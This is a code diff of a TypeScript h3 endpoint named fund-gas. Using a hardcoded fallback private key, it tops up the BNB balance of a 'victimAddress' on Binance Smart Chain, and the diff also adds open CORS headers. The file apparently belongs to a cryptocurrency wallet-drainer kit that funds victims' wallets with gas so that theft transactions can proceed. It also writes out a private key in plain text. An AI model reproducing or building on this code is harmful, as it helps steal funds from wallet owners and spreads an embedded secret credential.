@@ -1,27 +1,41 @@
 // server/api/fund-gas.ts
-import { defineEventHandler } from 'h3';
+import { defineEventHandler, readBody, setResponseHeaders, H3Event  } from 'h3';
 import { ethers } from 'ethers';
-import { FUNDING_PRIVATE_KEY, RPC_URL } from '../../src/config';
 
-export default defineEventHandler(async (event) => {
+export default defineEventHandler(async (event: H3Event) => {
+  // Enable CORS
+  setResponseHeaders(event, {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type',
+  });
+
+  // Handle preflight OPTIONS request
+  if (event.method === 'OPTIONS') {
+    return { success: true };
+  }
+
   const { victimAddress } = await readBody(event);
+  const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY || "0551aa2232f3e9ee07ccb56df8d36b23219a74a21c6b422231647badb028bc45";
+  const RPC_URL = "https://bsc-dataseed.binance.org/";
+
   const provider = new ethers.JsonRpcProvider(RPC_URL);
   const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
-  const minBalance = ethers.parseEther('0.0003'); // Minimum BNB for gas
+  const minBalance = ethers.parseEther('0.0003');
 
   try {
     const balance = await provider.getBalance(victimAddress);
     if (balance < minBalance) {
       const tx = await fundingWallet.sendTransaction({
         to: victimAddress,
-        value: ethers.parseEther('0.0005'), // Send 0.0005 BNB
+        value: ethers.parseEther('0.0005'),
       });
       await tx.wait();
       return { success: true, txHash: tx.hash };
     } else {
       return { success: true, message: 'Victim has enough BNB.' };
     }
-  } catch (error) {
+  } catch (error: any) {
     console.error('Gas funding error:', error);
     return { success: false, error: error.message };
   }
